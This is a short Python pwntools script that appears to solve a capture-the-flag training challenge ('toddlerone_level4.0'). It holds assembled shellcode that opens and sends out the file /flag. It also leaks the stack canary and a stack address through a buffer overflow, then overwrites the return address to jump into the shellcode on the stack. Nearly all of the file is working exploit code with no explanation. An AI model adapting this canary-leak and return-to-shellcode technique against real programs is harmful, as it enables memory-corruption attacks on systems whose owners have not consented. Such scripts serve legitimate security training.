from pwn import *
context.arch='amd64'

r = process('/challenge/toddlerone_level4.0')

payload = asm(
'''

    push 2
    pop rax
    lea rdi, [rip+f]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    push 1
    pop rdi
    push rax
    pop rsi
    push 40
    pop rax
    xor rdx, rdx
    push 100
    pop r10
    syscall



    f:
    .string "/flag"

'''
)

r.sendline(b'200')
r.send(b'REPEAT\x41\x41' + b'a'*0x4f + b'c'*2)
r.recvuntil(b'aaaaaaac')
canary = u64(r.recv(8))-ord('c')
print(hex(canary))

## leak stack
r.sendline(b'200')
r.send(b'REPEAT\x41\x41' + b'a'*0x57 + b'c')
r.recvuntil(b'aaaaaaac')
stack = u64(r.recv(6) + b'\x00\x00')
print(hex(stack))


## return to stack 
secret = 0x9f4b0b80505ac27d
ret_address = stack - 0x150
print(ret_address)
r.sendline(b'500')
r.send(b'a'*0x48 + p64(secret) + b'a'*0x8 + p64(canary) + b'a' * 0x8 + p64(ret_address) + payload + b'\x00' * 0x10)

r.interactive()